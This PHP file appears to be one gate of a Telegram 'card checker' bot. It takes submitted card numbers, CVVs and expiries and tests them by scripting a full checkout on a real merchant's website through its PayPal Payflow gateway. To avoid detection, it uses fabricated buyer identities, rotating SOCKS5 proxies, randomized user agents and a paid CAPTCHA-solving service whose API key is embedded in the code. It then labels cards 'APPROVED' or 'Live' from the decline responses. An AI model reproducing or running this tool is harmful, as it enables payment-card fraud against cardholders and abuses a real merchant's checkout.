<?php
require_once __DIR__ . '/../common.php';
list($cmd) = explode(" ", $message);
if($cmd == "/rt" or $cmd == ".rt" or $cmd == "!rt"){
$NameGater ='Rita';
$gateway = '/rt :'.$NameGater;

is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 3);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Payflow AVS</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!rt card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];

$firstDigit = $cc[0];

if ($firstDigit === '4' || $firstDigit === '5') {
    echo $firstDigit === '4' ? "La tarjeta es de tipo Visa." : "La tarjeta es de tipo MasterCard.";
} else {
    reply_to($chatId,$message_id,$keyboard,"<b>Tipo de tarjeta no soportado. Solo se aceptan Visa y MasterCard.</b>");
    die();
}


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

          

$socks5 = socks5();

$rotate = rotate(); 



if(strlen($ano) == 2 ){
  $ano = "20".$ano;
}

$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];


$cookies = tempnam(sys_get_temp_dir(), 'cookie');


$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];


$curl = new CurlX;


$maxRetries = 3; // número máximo de intentos
$retries = 0; // contador de intentos


if(strlen($ano) == 2 ){
    $ano = "20".$ano;
}

if ($mes < 10) {
    $mes = substr($mes, -1);
}



while ($retries < $maxRetries) {
    try { 
        $cookie = uniqid();
        $server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];


        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $req2 = $curl::Get('https://www.microscale.com/', $headers, $cookie, $server);
        if ($req2->code != "200") {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
    
        $session_id = trim(strip_tags($curl::ParseString($req2->headers->response['set-cookie'], 'mm5-MD-basket-id=', ';')));

        
        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-419,es;q=0.9',
            'cache-control: max-age=0',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://www.microscale.com',
            'referer: https://www.microscale.com/Merchant2/merchant.mvc?Session_ID='.$session_id.'&Screen=PROD&Store_Code=MD&Product_Code=10200&Category_Code=SGN',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $req2 = $curl::Post('https://www.microscale.com/Merchant2/merchant.mvc?Session_ID='.$session_id.'&', 'Quantity=1&Action=ADPR&Screen=PROD&Store_Code=MD&Product_Code=10200&Category_Code=SGN', $headers, $cookie, $server);
        if ($req2->code != "200") {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer: https://www.microscale.com/Merchant2/merchant.mvc?Session_ID='.$session_id.'&',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $req2 = $curl::Get('https://www.microscale.com/Merchant2/merchant.mvc?Session_ID='.$session_id.'&Screen=OINF&Store_Code=MD', $headers, $cookie, $server);
        if ($req2->code != "200") {
            throw new Exception("Connection error on request attempt #3 " . $retries . ". Please try again.");
        }
        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer: https://www.microscale.com/Merchant2/merchant.mvc?Session_ID='.$session_id.'&Screen=OINF&Store_Code=MD',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $req2 = $curl::Get('https://www.microscale.com/Merchant2/merchant.mvc?Session_ID='.$session_id.'&Screen=OCST&Store_Code=MD', $headers, $cookie, $server);
        if ($req2->code != "200") {
            throw new Exception("Connection error on request attempt #4 " . $retries . ". Please try again.");
        }
        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-419,es;q=0.9',
            'cache-control: max-age=0',
            'content-type: application/x-www-form-urlencoded',
            //'cookie: mm5-MD-basket-id='.$session_id.'; _ga=GA1.2.384655213.1720299285; _gid=GA1.2.839886645.1720299285; _ga_E8VV15CELE=GS1.2.1720299285.1.1.1720299690.0.0.0',
            'origin: https://www.microscale.com',
            'referer: https://www.microscale.com/Merchant2/merchant.mvc?Session_ID='.$session_id.'&Screen=OCST&Store_Code=MD',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $req2 = $curl::Post('https://www.microscale.com/Merchant2/merchant.mvc?Session_ID='.$session_id.'&', 'Action=ORDR&Screen=OUSL&Store_Code=MD&ShipFirstName='.$firstname.'&ShipLastName='.$lastname.'&ShipEmail='.urlencode($email).'&ShipPhone='.urlencode($phone).'&ShipFax=&ShipCompany=ORG&ShipAddress1=425+New+Byhalia+Rd&ShipAddress2=&ShipCity=Collierville&ShipStateSelect=TN&ShipState=&ShipZip=38017&ShipCountry=US&BillFirstName='.$firstname.'&BillLastName='.$lastname.'&BillEmail='.urlencode($email).'&BillPhone='.urlencode($phone).'&BillFax=&BillCompany=ORG&BillAddress1=425+New+Byhalia+Rd&BillAddress2=&BillCity=Collierville&BillStateSelect=TN&BillState=&BillZip=38017&BillCountry=US', $headers, $cookie, $server);

        if ($req2->code != "200") {
            throw new Exception("Connection error on request attempt #5 " . $retries . ". Please try again.");
        }
        $checkout_session = trim(strip_tags($curl::ParseString($req2->headers->response['set-cookie'], 'mm5-MD-checkout-session=', ';')));


        $option = [
            '5' => 'paypaladv:MASTERCARD', // MasterCard
            '4' => 'paypaladv:VISA', // Visa
        ];
        $type4 = urlencode($option[substr($cc ,0,1)]);


        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-419,es;q=0.9',
            'cache-control: max-age=0',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://www.microscale.com',
            'referer: https://www.microscale.com/Merchant2/merchant.mvc?Session_ID='.$session_id.'&',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $req2 = $curl::Post('https://www.microscale.com/Merchant2/merchant.mvc?Session_ID='.$session_id.'&Checkout_Session_ID='.$checkout_session.'&', 'Screen=OPAY&Action=SHIP%2CPSHP%2CCTAX&Store_Code=MD&ShippingMethod=flatrate%3AUSPS&PaymentMethod='.$type4.'&order_notes=', $headers, $cookie, $server);

        if ($req2->code != "200") {
            throw new Exception("Connection error on request attempt #6 " . $retries . ". Please try again.");
        }

        $PaymentAuthorizationToken = ($curl::ParseString($req2->body, '<input type="hidden" name="PaymentAuthorizationToken" value="', '"'));


        $solution = $solver->recaptchaV2(
            \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
            [
              'websiteURL'    => 'https://www.microscale.com/',
              'websiteKey'    => '6Lf2fiMTAAAAANN_5FCvmUdDI1P_cAXbuuK-s0cf',
            ]
        );
        $captcha = $solution["gRecaptchaResponse"];


        $option2 = [
            '5' => 'MasterCard', // MasterCard
            '6' => 'Discover', // Discover
            '4' => 'Visa', // Visa
            '3' => 'American+Express', // American Express
        ];
        $type2 = $option2[substr($cc ,0,1)];

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-419,es;q=0.9',
            'cache-control: max-age=0',
            'content-type: application/x-www-form-urlencoded',
            //'cookie: mm5-MD-basket-id='.$session_id.'; _ga=GA1.2.384655213.1720299285; _gid=GA1.2.839886645.1720299285; mm5-MD-checkout-session='.$checkout_session.'; _ga_E8VV15CELE=GS1.2.1720299285.1.1.1720299913.0.0.0',
            'origin: https://www.microscale.com',
            'referer: https://www.microscale.com/Merchant2/merchant.mvc?Session_ID='.$session_id.'&Checkout_Session_ID='.$checkout_session.'&',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $req2 = $curl::Post('https://www.microscale.com/Merchant2/merchant.mvc?Session_ID='.$session_id.'&Checkout_Session_ID='.$checkout_session.'&', 'Action=AUTH&Screen=INVC&Store_Code=MD&PaymentAuthorizationToken='.$PaymentAuthorizationToken.'&g-recaptcha-response='.$captcha.'&PaymentMethod='.$type4.'&payment_type='.$type2.'&PayPalAdv_CardNumber='.$cc.'&PayPalAdv_CardExp_Month='.$mes.'&PayPalAdv_CardExp_Year='.$ano.'&PayPalAdv_CardCvv='.$cvv.'', $headers, $cookie, $server);

        if ($req2->code != "200") {
            throw new Exception("Connection error on request attempt #7 " . $retries . ". Please try again.");
        }
        break; 
    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
            $text = Textretries();
            bot('editMessageText', ['chat_id'=>$chatId, 'message_id'=>$messageidtoedit, 'text'=>$text, 'parse_mode'=>'html', 'reply_to_message_id'=> $message_id]);
            return;
        }
    }
}

preg_match('/Unable to authorize payment: (.+?)<br>/', $req2->body, $matches);
$mgs = $matches[1];

$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 2);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow AVS
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);



if(substr_count($req2->body, 'CVV2 Mismatch')){
$status = "APPROVED ✅";
$response = "CVV2 Mismatch!";
}elseif(substr_count($req2->body, 'Insufficient funds')){
$status = "APPROVED ✅";
$response = "Insufficient funds!";
}elseif(substr_count($req2->body, 'Insufficient funds')){
$status = "APPROVED ✅";
$response = "Insufficient funds!";
}elseif(substr_count($result2, 'CVV Note: No Match')){
$status = "Live! ✅";
$response = $mgs;
}elseif(substr_count($result2, 'Insufficient Funds')){
$status = "APPROVED CVV! ✅";
$response = $mgs;
}else{
$status = "Declined ❌";
$response = "$mgs";
   }
   
   
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


}

